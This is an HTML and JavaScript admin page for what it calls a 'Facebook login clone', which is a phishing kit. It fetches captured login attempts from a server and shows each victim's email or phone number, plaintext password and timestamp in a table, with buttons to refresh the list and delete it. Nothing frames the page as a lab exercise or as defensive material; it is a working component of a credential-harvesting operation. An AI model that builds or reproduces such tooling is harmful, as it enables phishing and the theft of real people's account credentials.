<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin Panel — Stored Logins</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #f0f2f5;
      min-height: 100vh;
      padding: 24px 16px;
    }
    h1 {
      font-size: 24px;
      color: #1877F2;
      margin-bottom: 8px;
    }
    .subtitle {
      font-size: 14px;
      color: #65676B;
      margin-bottom: 24px;
    }
    .card {
      background: white;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,.12);
      overflow: hidden;
    }
    table {
      width: 100%;
      border-collapse: collapse;
    }
    thead {
      background: #1877F2;
      color: white;
    }
    th, td {
      text-align: left;
      padding: 12px 16px;
      font-size: 14px;
      border-bottom: 1px solid #dddfe2;
    }
    tr:last-child td { border-bottom: none; }
    tr:hover td { background: #f0f2f5; }
    .empty {
      text-align: center;
      padding: 40px;
      color: #65676B;
      font-size: 16px;
    }
    .count {
      font-size: 13px;
      color: #65676B;
      padding: 12px 16px;
      background: #f0f2f5;
      border-top: 1px solid #dddfe2;
    }
    .refresh-btn {
      display: inline-block;
      margin-bottom: 16px;
      background: #1877F2;
      color: white;
      border: none;
      border-radius: 6px;
      padding: 10px 20px;
      font-size: 14px;
      cursor: pointer;
    }
    .refresh-btn:hover { background: #166FE5; }
    .clear-btn {
      display: inline-block;
      margin-bottom: 16px;
      margin-left: 8px;
      background: #e41e3f;
      color: white;
      border: none;
      border-radius: 6px;
      padding: 10px 20px;
      font-size: 14px;
      cursor: pointer;
    }
    .header-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      flex-wrap: wrap;
      gap: 12px;
      margin-bottom: 8px;
    }
  </style>
</head>
<body>
  <div class="header-row">
    <div>
      <h1>🔐 Admin Panel</h1>
      <p class="subtitle">All login attempts stored from the Facebook login clone</p>
    </div>
    <div>
      <button class="refresh-btn" onclick="loadData()">⟳ Refresh</button>
      <button class="clear-btn" onclick="clearData()">🗑 Clear All</button>
    </div>
  </div>

  <div class="card">
    <table>
      <thead>
        <tr>
          <th>#</th>
          <th>Email / Phone</th>
          <th>Password</th>
          <th>Date &amp; Time</th>
        </tr>
      </thead>
      <tbody id="tableBody">
        <tr><td colspan="4" class="empty">Loading...</td></tr>
      </tbody>
    </table>
    <div class="count" id="countRow">0 entries</div>
  </div>

<script>
  async function loadData() {
    const tbody = document.getElementById('tableBody');
    const countRow = document.getElementById('countRow');
    try {
      const res = await fetch('/admin/data');
      const data = await res.json();

      if (data.length === 0) {
        tbody.innerHTML = '<tr><td colspan="4" class="empty">No login attempts yet.</td></tr>';
        countRow.textContent = '0 entries';
        return;
      }

      tbody.innerHTML = data.map((entry, i) => `
        <tr>
          <td>${i + 1}</td>
          <td>${escapeHtml(entry.identifier)}</td>
          <td>${escapeHtml(entry.password)}</td>
          <td>${new Date(entry.timestamp).toLocaleString()}</td>
        </tr>
      `).join('');

      countRow.textContent = `${data.length} entr${data.length === 1 ? 'y' : 'ies'} total`;
    } catch(e) {
      tbody.innerHTML = '<tr><td colspan="4" class="empty">⚠ Could not connect to server. Make sure it is running.</td></tr>';
    }
  }

  async function clearData() {
    if (!confirm('Are you sure you want to delete ALL entries?')) return;
    try {
      await fetch('/admin/clear', { method: 'DELETE' });
      loadData();
    } catch(e) {
      alert('Error clearing data.');
    }
  }

  function escapeHtml(str) {
    return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  }

  loadData();
</script>
</body>
</html>
